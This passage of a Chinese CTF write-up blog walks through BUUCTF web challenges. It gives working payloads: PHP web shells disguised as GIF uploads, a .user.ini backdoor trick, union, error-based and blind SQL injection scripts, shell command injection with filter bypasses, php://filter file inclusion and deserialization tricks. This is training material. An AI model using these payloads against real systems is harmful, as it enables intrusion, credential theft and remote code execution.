+                <div class="image-caption"></div>
+            </figure>
+
+<p>拿到 cookie 就 OK 了！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5value</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(s)</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiami</span><span class="params">()</span>:</span></span><br><span class="line">    filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie_s =<span class="string">"ea7d75de-4ca5-486a-a69c-e690f3a8c217"</span></span><br><span class="line">    print(md5value(filename.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    x=md5value(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    y=cookie_s+xprint(md5value(y.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=265&originWidth=1238&size=0&status=done&style=none&width=1037" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h1 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h1><p>这道题目有两种解法，一种是：<strong>*,1</strong>，这样查询结果会把表中所有的数据返回来（据说是非预期解，出题人可能忘记过滤掉*了）<br>还有一种说是考察 sql_mode，通过堆叠注入修改 sql_mode，<br>可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT  来实现将 <code>||</code> 视为字符串连接符而非   或   运算符<br>因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag</p>
+<p>Payload :<br>1;set sql_mode=PIPES_AS_CONCAT;SELECT 1<br>拼接后就变成了<br>SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag</p>
+<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>访问提示源码在 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f.png#align=left&display=inline&height=176&margin=%5Bobject%20Object%5D&originHeight=327&originWidth=1146&size=0&status=done&style=none&width=617" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在网址后面加上 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>  是可以下载下来的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=620&originWidth=1250&size=0&status=done&style=none&width=891" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>下下来里面超级多 php 文件，用大佬的  python  脚本筛选出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'D:/anquan/localtest/PHPTutorial/WWW/CTFtraining/BUUCTF/src/'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'D:/anquan/localtest/PHPTutorial/WWW/CTFtraining/BUUCTF/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'echo "got it"'</span></span><br><span class="line">            flag = <span class="string">'got it'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1/CTFtraining/BUUCTF/src/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"got it"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1/CTFtraining/BUUCTF/src/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"got it"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>我参考的网上的 wp  直接把 x 开头之前的  php  文件删掉了，不然要跑很长时间（php  版本要用 7  以上的）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f.png#align=left&display=inline&height=149&margin=%5Bobject%20Object%5D&originHeight=149&originWidth=783&size=0&status=done&style=none&width=783" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>访问  xk0SzyKwfzw.php?Efa5BVG= cat /flag  得到 flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=405&originWidth=1911&size=0&status=done&style=none&width=1102" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>网上的  wp  有三个方法，这里只记录一个，Unicode 欺骗<br><a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
+<p>注册用户：ᴬdmin<br>会将其变成：Admin<br>修改密码的时候会变成：admin<br>这样就可以直接访问 admin 用户</p>
+<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>拿到题目，是一个上传界面</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=222&originWidth=395&size=0&status=done&style=none&width=395" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>尝试上传，php 显示非法后缀，传图马显示内容里面有 &lt;?<br>尝试这样的：</p>
+<blockquote>
+<p>GIF89a</p>
+<script language="php">eval ($_POST['yichen']);</script>
+</blockquote>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=196&originWidth=722&size=0&status=done&style=none&width=722" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>成功上传，同时还显示了文件夹下的内容<br><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&originHeight=257&originWidth=1116&size=0&status=done&style=none&width=751" alt=""></p>
+<p>想上传 .htaccess  把图片马解析成为  php  但是失败了<br>看  wp 以后学到了 .user.ini  来上传后门<br>了解一下，先从 php.ini 说起  php.ini  是  php  的默认配置文件，其中包括了很多  php  的配置<br>其中 PHP_INI_USER 的配置项，可以在 ini_set () 函数中设置、注册表中设置，再就是.user.ini 中设置可以理解为  php  是允许用户自定义的  php.ini<br>实际上，除了 <code>PHP_INI_SYSTEM</code> 以外的模式（包括 PHP_INI_ALL）都是可以通过.user.ini 来设置的<br>而且  php.ini  是种动态加载的  ini  文件，不需要重启服务，只需要等待<code>user_ini.cache_ttl</code> 所设置的时间（默认 300 秒）就可以<br>需要看的是这两个选项，它们的作用是指定一个文件，会自动把这个文件包含在其他要执行的文件里面，相当于 require()</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&originHeight=181&originWidth=1059&size=0&status=done&style=none&width=1059" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用方法很简单，只需要在 .user.ini  文件中写：<br>auto_prepend_file=文件名（比如：yichen.jpg）</p>
+<p>解题：先上传一个 .user.ini  文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&originHeight=152&originWidth=424&size=0&status=done&style=shadow&width=424" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在上传一个  yichen.jpg 文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&originHeight=156&originWidth=473&size=0&status=done&style=shadow&width=473" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>然后在访问同一文件夹下的 index.php  就可以得到 flag  了</p>
+<h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>sql 注入题目，通过基于时间的盲注可以测出来，但是不会写脚本，懒得一个一个测，看了师傅们的 wp<br>  师傅们用了 异或   这种操作，长见识了，师傅们的 WP：<br>（意识到应该整理一些  sqli  的 FUZZ  字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://af100f25-ad84-449a-98cc-64ef4e7fda40.node3.buuoj.cn"</span></span><br><span class="line">    flag=<span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">    final=<span class="string">""</span></span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">         print(<span class="string">"*"</span>*<span class="number">50</span>,i,<span class="string">"*"</span>*<span class="number">50</span>)</span><br><span class="line">         stop=<span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">             html = etree.HTML(re).xpath(<span class="string">"//text()"</span>)</span><br><span class="line">             <span class="comment"># print("&gt;&gt;",html)</span></span><br><span class="line">             <span class="keyword">if</span> flag <span class="keyword">in</span> html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(<span class="string">"\n\t\t\t\t"</span>,final)</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">         <span class="keyword">if</span> stop &gt;= <span class="number">128</span>:</span><br><span class="line">            print(<span class="string">"*"</span>*<span class="number">50</span>,<span class="string">"结束"</span>)</span><br><span class="line">            print(<span class="string">"&gt;&gt;"</span>,final)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Easy-Cacl"><a href="#Easy-Cacl" class="headerlink" title="Easy Cacl"></a>Easy Cacl</h1><p>** PHP  字符串解析特性**：<br>  当 php  查询字符串进行解析的时候会将某些字符删除或用下划线代替<br>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&originHeight=408&originWidth=1105&size=0&status=done&style=none&width=720" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 freebuf 的文章中，发现了上面这些是可以被用来替换的<br>用到这道题目上来， WAF  的存在使得没法给  num  传字符，但是如果在  num 前面加上个空格，那样 WAF 在检测的时候就不会检测到 num  这个参数，但是 PHP 在解析的时候会把空格删掉，这样就可以命令执行了，同时  calc.php  中还有个黑名单，可以使用  chr()  来绕过<br>查看目录<br>calc.php? num=1;var_dump(scandir(chr(47)))<br>查看  flag<br>calc.php? num=1;var_dump(readfile(chr(47).f1agg))<br>不太明白为啥直接 f1agg 不行</p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; order by 4# 显示 Unknown column &#39;4&#39; in &#39;order clause&#39;</span><br><span class="line">不能用%23百分号会被url编码</span><br><span class="line">admi1n&#39; union select 1,2,3# 回显在2,3</span><br><span class="line">admin1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line">拿到geek!数据库</span><br><span class="line">admin1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;geek&#39;#</span><br><span class="line">数据表geekuser,l0ve1ysq1</span><br><span class="line">admin1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;#</span><br><span class="line">列名id,username,password</span><br><span class="line">admin1&#39; union select 1,group_concat(id,username,password),3 from l0ve1ysq1#</span><br></pre></td></tr></table></figure>
+
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>伪协议文件包含<br>?file=php://filter/convert.base64-encode/resource=flag.php</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>访问之后只有个 ?ip=，尝试 127.0.0.1;ls 出来结果，然后去 cat 的时候禁用了空格，用 $IFS$6 替代（数字随意），但是 flag 也被过滤了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599439530112-38110668-82aa-44e5-a7ad-fcf4173058d1.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1048&size=112267&status=done&style=stroke&width=524" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以直接 cat$IFS$6<code>ls</code><br>也可以 echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</p>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>post 传参<br>target=;cat  ../../../flag</p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>访问页面有个 Secret.php<br>根据提示最后这样</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599441456096-099530c3-e706-4d9d-9d47-9f5d0069078d.png#align=left&display=inline&height=555&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1262&size=122033&status=done&style=stroke&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ad1min&#39;uniunionon seselectlect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata#</span><br><span class="line">爆库名</span><br><span class="line">ad1min&#39;uniunionon seselectlect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;&#39;geek&#39;#</span><br><span class="line">爆表名b4bsql,geekuser</span><br><span class="line">ad1min&#39;uniunionon seselectlect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;#</span><br><span class="line">爆列名</span><br><span class="line">admin1&#39;uniunionon seselectlect 1,group_concat(id,username,passwoorrd),3 frfromom b4bsql#</span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>上传 phtml 的马，内容是<br>注意改一下 Content-Type: image/jpeg</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="keyword">eval</span> ($_POST[<span class="string">'yichen'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后蚁剑连接，找到 flag</p>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>在 index.php.bak 看到源码，大致内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">  <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
+
+<p>弱类型，直接传 key=123 就可以</p>
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>跟 <a href="https://www.yuque.com/hxfqg9/web/adhlix#lIrAK" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/web/adhlix#lIrAK</a> 一样</p>
+<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599457047473-389a1d6d-9a43-4242-9532-a5b78c34d7a2.png#align=left&display=inline&height=373&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1153&size=89853&status=done&style=stroke&width=576.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>php 代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>?text=php://input&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>post 传参 welcome to the zjctf</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599459160439-55f026c7-c2b2-42c2-a289-f73a56a6c555.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=695&originWidth=1305&size=105937&status=done&style=stroke&width=652.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>访问重定向得到 hint</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1599460088458-01e567c9-3e95-4a28-8161-93c05a2f6bfa.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=375&size=26979&status=done&style=stroke&width=291" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>提交：ffifdyop<br>然后一个 MD5 弱类型、一个 MD5 强碰撞</p>
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>通过个人界面的 sql 注入查询得到的数据可以看到是经过序列化后的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600066589109-78520007-e35a-44ce-9f7e-16cd2028e7e8.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=612&originWidth=1214&size=106377&status=done&style=stroke&width=677" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>下面有个 the contents of his/her blog，因为在</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600066859906-6432a015-8c1d-438f-9f3d-8a98fceb8901.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=1445&size=51221&status=done&style=stroke&width=722.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><code>-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39; from users--+</code><br>在源代码中得到 base64，解码得到 flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600067327093-48e5311e-0218-4078-9a16-bd150d040658.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1079&originWidth=1920&size=195495&status=done&style=stroke&width=960" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>爆库：geek<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code><br>爆表：H4rDsq1<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</code><br>爆字段：id,username,password<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</code><br>爆数据<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code><br><code>1&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</code></p>
